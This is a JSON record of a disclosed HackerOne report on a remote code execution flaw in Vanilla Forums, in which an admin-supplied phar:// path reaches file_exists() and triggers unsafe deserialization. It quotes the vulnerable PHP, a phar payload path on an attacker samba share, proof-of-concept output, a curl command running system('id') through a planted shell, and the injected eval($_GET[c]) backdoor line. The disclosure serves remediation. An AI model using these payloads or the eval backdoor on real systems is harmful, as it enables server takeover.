@@ -1,0 +1,166 @@
+{
+  "id": 410237,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MTAyMzc=",
+  "url": "https://hackerone.com/reports/410237",
+  "title": "Vanilla Forums ImportController index file_exists Unserialize Remote Code Execution Vulnerability",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-09-16T05:21:06.306Z",
+  "submitted_at": "2018-09-16T05:21:06.306Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "mr_me",
+    "url": "/mr_me",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 17443,
+    "url": "https://hackerone.com/vanilla",
+    "handle": "vanilla",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/017/443/2720e6aeb834de4fd40765a5cae34abb78eb66cd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Vanilla",
+      "twitter_handle": "vanilla",
+      "website": "http://vanillaforums.com",
+      "about": "Vanilla is a powerfully simple discussion forum you can easily customize to make as unique as your community."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-11-23T15:45:43.118Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-10-24T15:45:40.565Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n\nAn authenticated admin user can inject an serialized payload into a phar archive and trigger read access to it via an unprotected file_exists(). An attacker\ncan leverage this to deserialize untrusted data and gain remote code execution.\n\n## Notes:\n\n- You need to have an admin account to run this poc.\n- The default path to the constants.php file is '/var/www/html/conf/constants.php', please change it in your poc files, if you need. I have installed my version of Vanilla Forums in /var/www/html\n- BEWARE!! This poc will damage the application and overwrite constants.php. Make sure you back up your installation before running it!\n- In my poc I used an upload primitive for the phar archive, but if you wanted to remotely exploit on Winodws, you could use a samba share. I have tested this and its proved to be working 100%.\n  The payload would look like phar:////attacker-share/share/poc.jpg\n- Also note, we can use whatever extension we like for the phar archive, this would help in bypassing file upload checks/etc.\n\n## Analysis:\n\nInside of applications/dashboard/controllers/class.importcontroller.php we can see the following code\n\n```\nclass ImportController extends DashboardController {\n\n    ...\n\n    public function index() {\n        $this->permission('Garden.Import'); // This permission doesn't exist, so only users with Admin == '1' will succeed.\n        $timer = new Gdn_Timer();\n\n        // Determine the current step.\n        $this->Form = new Gdn_Form();\n        $imp = new ImportModel();\n        $imp->loadState();\n\n        // Search for the list of acceptable imports.\n        $importPaths = [];\n        $existingPaths = safeGlob(PATH_UPLOADS.'/export*', ['gz', 'txt']);\n        $existingPaths2 = safeGlob(PATH_UPLOADS.'/porter/export*', ['gz']);\n        $existingPaths = array_merge($existingPaths, $existingPaths2);\n        foreach ($existingPaths as $path) {\n            $importPaths[$path] = basename($path);\n        }\n        // Add the database as a path.\n        $importPaths = array_merge(['db:' => t('This Database')], $importPaths);\n\n        if ($imp->CurrentStep < 1) {\n            // Check to see if there is a file.\n            $importPath = c('Garden.Import.ImportPath');\n            $validation = new Gdn_Validation();\n\n\n            if (Gdn::request()->isAuthenticatedPostBack(true)) {\n                $upload = new Gdn_Upload();\n                $validation = new Gdn_Validation();\n                if (count($importPaths) > 0) {\n                    $validation->applyRule('PathSelect', 'Required', t('You must select a file to import.'));\n                }\n\n                if (count($importPaths) == 0 || $this->Form->getFormValue('PathSelect') == 'NEW') {                 // 1\n                    $tmpFile = $upload->validateUpload('ImportFile', false);\n                } else {\n                    $tmpFile = '';\n                }\n\n                if ($tmpFile) {\n                    $filename = $_FILES['ImportFile']['name'];\n                    $extension = pathinfo($filename, PATHINFO_EXTENSION);\n                    $targetFolder = PATH_ROOT.DS.'uploads'.DS.'import';\n                    if (!file_exists($targetFolder)) {\n                        mkdir($targetFolder, 0777, true);\n                    }\n                    $importPath = $upload->generateTargetName(PATH_ROOT.DS.'uploads'.DS.'import', $extension);\n                    $upload->saveAs($tmpFile, $importPath);\n                    $imp->ImportPath = $importPath;\n                    $this->Form->setFormValue('PathSelect', $importPath);\n\n                    $uploadedFiles = val('UploadedFiles', $imp->Data);\n                    $uploadedFiles[$importPath] = basename($filename);\n                    $imp->Data['UploadedFiles'] = $uploadedFiles;\n                } elseif (($pathSelect = $this->Form->getFormValue('PathSelect'))) {                                // 2\n                    if ($pathSelect == 'NEW') {\n                        $validation->addValidationResult('ImportFile', 'ValidateRequired');\n                    } else {\n                        $imp->ImportPath = $pathSelect;                                                             // 3\n                    }\n                } elseif (!$imp->ImportPath && count($importPaths) == 0) {\n                    // There was no file uploaded this request or before.\n                    $validation->addValidationResult('ImportFile', $upload->Exception);\n                }\n\n                // Validate the overwrite.\n                if (true || strcasecmp($this->Form->getFormValue('Overwrite'), 'Overwrite') == 0) {\n                    if (!stringBeginsWith($this->Form->getFormValue('PathSelect'), 'Db:', true)) {\n                        $validation->applyRule('Email', 'Required');\n                    }\n                }\n\n                if ($validation->validate($this->Form->formValues())) {\n                    $this->Form->setFormValue('Overwrite', 'overwrite');\n                    $imp->fromPost($this->Form->formValues());\n                    $this->View = 'Info';\n                } else {\n                    $this->Form->setValidationResults($validation->results());\n                }\n            } else {\n                $this->Form->setFormValue('PathSelect', $imp->ImportPath);\n            }\n            $imp->saveState();\n        } else {\n            $this->setData('Steps', $imp->steps());\n            $this->View = 'Info';\n        }\n\n        if (!stringBeginsWith($imp->ImportPath, 'db:') && !file_exists($imp->ImportPath)) {                         // 4\n            $imp->deleteState();\n        }\n```\n\nAt [1], we make sure our `PathSelect` is not set as \"NEW\". Then at [2] the code sets the `$pathSelect` variable from attacker controlled input. At [3] the code sets the `$imp->ImportPath` variable to the attackers fully controlled string. Finally at [4] we reach a file_exists() call with attacker controlled input, leading to deserialization inside of the phar archive.\n\n## Exploitation:\n\nIn my poc I used a file upload, but you could also use a remote samba share if you are targeting a Windows installation of Vanilla Forums.The payload would look like phar:////attacker-share/share/poc.phar/.jpg\n\n## Example:\n\nThe following steps are used to re-create the vulnerability:\n\n1. We create our phar file:\n\n`saturn:~ mr_me$ php poc-stage-1.php`\n\n2. We run the poc-stage-2.py which will trigger the bug\n\n```\nsaturn:~ mr_me$ ./poc-stage-2.py.py 172.16.175.143 admin:admin123\n(+) targeting: http://172.16.175.143\n(+) logged in!\n(+) uploaded phar!\n(+) leaked phar name!\n(+) triggered a write!\n(+) shell at: http://172.16.175.143/?c=phpinfo();\n\nsaturn:~ mr_me$ curl -sSG \"http://172.16.175.143/?c=system('id');\"\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n```\n\nNow, on the victim box:\n\n```\nsteven@pluto:/var/www/html/conf$ cat constants.php \n<?php if (!defined('APPLICATION')) exit();\n$a=eval($_GET[c]);//[''] = '';\n\n// Last edited by admin (172.16.175.1)2018-09-16 00:59:01steven@pluto:/var/www/html/conf$\n```\n\n## References:\n\n- https://rdot.org/forum/showthread.php?t=4379\n\n## Impact\n\nAn authenticated attacker can gain remote code execution. The supplied poc will inject PHP code into the constants.php file. Please be aware that this will damage your system, please take the correct steps to avoid frustration.",
+  "bounty_amount": "600.0",
+  "formatted_bounty": "$600",
+  "weakness": {
+    "id": 52,
+    "name": "Deserialization of Untrusted Data"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 346904,
+      "file_name": "vanilla_forums_importcontroller_index_file_exists_unserialize_rce.zip",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/346/904/19506996dc979d5c1a5ca5bc3a7ba3a960eb2835/vanilla_forums_importcontroller_index_file_exists_unserialize_rce.zip?response-content-disposition=attachment%3B%20filename%3D%22vanilla_forums_importcontroller_index_file_exists_unserialize_rce.zip%22%3B%20filename%2A%3DUTF-8%27%27vanilla_forums_importcontroller_index_file_exists_unserialize_rce.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3IMMHD7U%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T131109Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDckwknQq7fjHwY7%2FK9F%2BtvO9fLJDuG1NEZXXMxYw8hbwIhAM3er0SlLN2AYaRXWazeiwtSjADmim0DnY8YcGf4Y8SxKrEFCHUQAxoMMDEzNjE5Mjc0ODQ5Igww2o2qmJ5MWkfa74sqjgUMDHXvf3xxgarNNUDSIN7iuGoSARtn65gvdJ4%2BO%2FkXeF39tTNpPNp3gbMxN08cJsUGQsiwR96l9CPUzLY7LHBxHFojvFr3ITM3J4EJtd3JktNeEkJgVr%2FsEnXuvSlNfFhDmvSEfMGUHb4UbVaVoFQ4SNJecAghbZ4R2R6eho8SeZVEYbq749PMxfWZg3uRG8JgtVyqoY1jpCk0kh4f43bzUZ6Tk0NwL6H2YD1r28GPSdM2NMS0DQHVK52MQWqHFxqvZOB0JavCD6yzZmm375qMFj70T9kjeA3ygDsQWnINhhNEokIipgBb9big4jerkxPZKXHkMEn8kTRjdpaGnqT31eS2Ap3%2BS%2B4%2BDmGqYt5cnry1J7sVtfs6SJBo2KwCm3ieX3J9ZiFPRwbpDrCFs0h81ZvXr03wFCruJw3pNftO4v61HT2vFYwafngQ66iRf4ccw2WitEv8dDqy88fiyfo8PkzIKNQIGf7F%2FGVErGB7zEj7qRAyMBXCY0PP4WHQscGLLucR9RYE1pVgzzs3BCA9j6D9M6C2DUCcO%2BW%2BQmZSaDSPS08WMv4oYHFXYggOIv%2FTINF9J4pMXNDPjCxtu2OWtH7uHoi1NNCNlUe9xnu5aYimPddy8D73j8KGddAo1w6IoKy4kpqEs8NU%2BXnLLIo%2F8OkgGBLEwmIu9T%2Bu6Oz7XkrYifOXYMDpFUfwTPN9W4JsrMXt%2F3wugpQN4Fk4kWsib7XEy1iPAo764glVM3P7J4XVtoYVee04ZiKms2%2FCu1rNFAWnpdtEP6RHFeEvOqGBX9C3g9xvfaapxWX1FccdWfkK68y%2Bh%2FMy24XhzUb14mI24ZTU9zIXOy%2BHFqYVkAOt7UQ1Gb4HE6VcsU%2B8JXcw5bStrgY6sAE07AhFgeocUOJkN2I%2Fu89%2FcNWBSx3BcejUfJX3Y1%2FMNQpv784p5QFf%2BWHp0%2BUGiFxL%2FYZ7bz0IANiUOzMv59zqaW%2FP4WOMYPVgyzZAVw3B2h%2B4laP9i2zcnD6y1B8D0yz1mg3ghUGJo8C0Z5LhCaAHi7hr3CmQatY39rwKj4%2BzrrqtAaWIIqOwkXgJ89Q5MnwR3YpKSnVnS%2BtFWl0%2BIltP2OXBDv%2Fq7N9nB1%2FEoAh%2FZA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7f1feb9e912c71660032c4cc2267bfa88ee1c5876c9ba300c60485496e7626df",
+      "file_size": 164771,
+      "type": "application/zip",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2018-11-23T15:45:40.636Z",
+  "allow_singular_disclosure_after": -164841929.02087206,
+  "singular_disclosure_allowed": true,
+  "vote_count": 39,
+  "voters": [
+    "irek",
+    "fqdn",
+    "inhibitor181",
+    "bughacher",
+    "sameerphad72",
+    "spam404",
+    "ali",
+    "ahiezer",
+    "theappsec",
+    "harry_mg",
+    "and 29 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.1,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "high",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 2101,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.vanillaforums.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 10546,
+      "category": "researcher",
+      "content": "An authenticated admin user can inject an serialized payload into a phar archive and trigger a read access to it via an unprotected file_exists(). An attacker can leverage this to deserialize untrusted data and gain remote code execution.",
+      "user": {
+        "id": 41443,
+        "username": "mr_me",
+        "name": "Steven Seeley",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "https://srcincite.io/",
+        "location": "",
+        "created_at": "2015-10-08T18:38:12.546Z",
+        "url": "https://hackerone.com/mr_me",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/041/443/87c206e9ba716dc99839e7bfd04c0279d74fa6cc_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    }
+  ]
+}
